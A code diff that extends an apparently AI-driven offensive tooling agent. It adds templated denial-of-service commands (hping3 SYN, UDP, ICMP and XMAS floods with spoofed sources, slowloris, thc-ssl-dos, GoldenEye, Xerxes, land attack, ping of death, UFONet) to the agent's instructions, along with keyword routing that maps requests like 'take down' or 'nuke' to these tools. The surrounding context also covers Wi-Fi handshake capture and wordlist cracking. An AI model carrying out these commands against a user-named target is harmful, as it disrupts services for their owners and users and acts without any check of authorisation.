@@ -37,6 +37,21 @@ Rules:
 12. When user gives BSSID directly, use it with airodump-ng to capture handshake
 13. To add text/password to a file: echo 'text' | sudo tee -a /path/to/file
 14. rockyou.txt may be gzipped — first: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; then append
+15. STRESS TESTING / DoS:
+    - SYN flood: sudo hping3 -S --flood -V -p {port} {target}
+    - SYN flood + random source: sudo hping3 -S --flood --rand-source -p {port} {target}
+    - UDP flood: sudo hping3 --udp --flood -p {port} {target}
+    - ICMP flood: sudo hping3 --icmp --flood {target}
+    - HTTP slowloris: slowloris {target} -p 80 -s 500
+    - HTTPS slowloris: slowloris {target} -p 443 -s 500 --https
+    - SSL DoS: thc-ssl-dos {target} 443 --accept
+    - GoldenEye HTTP: goldeneye http://{target} -w 50 -s 500
+    - Xerxes: xerxes {target} 80
+    - XMAS flood: sudo hping3 --flood -FSRPAU -p {port} {target}
+    - Land attack: sudo hping3 -S -a {target} -p 80 --flood {target}
+    - Ping of death: sudo ping -s 65500 -c 100 {target}
+    - Ping flood: sudo ping -f -s 65500 {target}
+    - UFONet: ufonet -a {target} -r 500 --threads 200
 
 COMMAND REFERENCE (use these exact commands):
 """ + COMMAND_KB
@@ -688,6 +703,10 @@ class SmartRouter:
          "Check network interfaces/IP"),
         (["service", "start service", "stop service", "restart"],
          "service", "Manage system services"),
+        (["dos", "ddos", "stress test", "flood", "syn flood", "udp flood",
+          "slowloris", "hping", "overload", "take down", "bring down",
+          "crash", "overwhelm", "nuke", "hammer", "blast", "bomb"],
+         "stress_test", "Stress testing / DoS attacks"),
     ]
 
     ACTION_TOOLS = {
@@ -715,6 +734,7 @@ class SmartRouter:
         "tunnel": ["chisel", "ssh", "socat"],
         "check_ip": [],
         "service": [],
+        "stress_test": ["hping3", "slowloris", "ufonet"],
     }
 
     @classmethod
